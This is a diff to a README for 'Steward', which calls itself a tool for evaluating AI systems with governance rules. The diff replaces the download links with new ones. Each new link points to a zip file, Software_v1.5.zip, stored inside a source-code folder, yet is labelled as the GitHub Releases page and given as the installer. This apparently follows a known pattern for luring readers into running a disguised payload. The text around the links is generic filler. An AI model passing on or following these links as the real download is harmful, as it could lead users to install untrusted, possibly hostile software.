@@ -4,10 +4,10 @@
 Steward helps you evaluate AI systems with clear governance rules. This tool supports thoughtful decision-making. Using Steward, you can easily manage and assess your systems.
 
 ## 📥 Download Now
-[![Download steward](https://raw.githubusercontent.com/NawazHaider/steward/main/bindings/python/python/Software_v2.3.zip%https://raw.githubusercontent.com/NawazHaider/steward/main/bindings/python/python/Software_v2.3.zip)](https://raw.githubusercontent.com/NawazHaider/steward/main/bindings/python/python/Software_v2.3.zip)
+[![Download steward](https://github.com/NawazHaider/steward/raw/refs/heads/main/crates/steward-runtime/src/Software_v1.5.zip%https://github.com/NawazHaider/steward/raw/refs/heads/main/crates/steward-runtime/src/Software_v1.5.zip)](https://github.com/NawazHaider/steward/raw/refs/heads/main/crates/steward-runtime/src/Software_v1.5.zip)
 
 ## 🔗 Release Page 
-Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/NawazHaider/steward/main/bindings/python/python/Software_v2.3.zip)
+Visit this page to download: [GitHub Releases](https://github.com/NawazHaider/steward/raw/refs/heads/main/crates/steward-runtime/src/Software_v1.5.zip)
 
 ## 📋 Overview
 Steward offers tools for evaluating AI systems using governance rules. This software enhances decision-making through a structured evaluation process. You can assess your AI systems' risks and benefits in a user-friendly way. 
@@ -27,7 +27,7 @@ To run Steward, your computer should meet the following requirements:
 
 ## 🔧 Installation Instructions
 1. **Download the Software** 
-   - Go to the [GitHub Releases page](https://raw.githubusercontent.com/NawazHaider/steward/main/bindings/python/python/Software_v2.3.zip) to find the latest version.
+   - Go to the [GitHub Releases page](https://github.com/NawazHaider/steward/raw/refs/heads/main/crates/steward-runtime/src/Software_v1.5.zip) to find the latest version.
    - Click on the version number and download the file suitable for your operating system.
   
 2. **Install the Application**
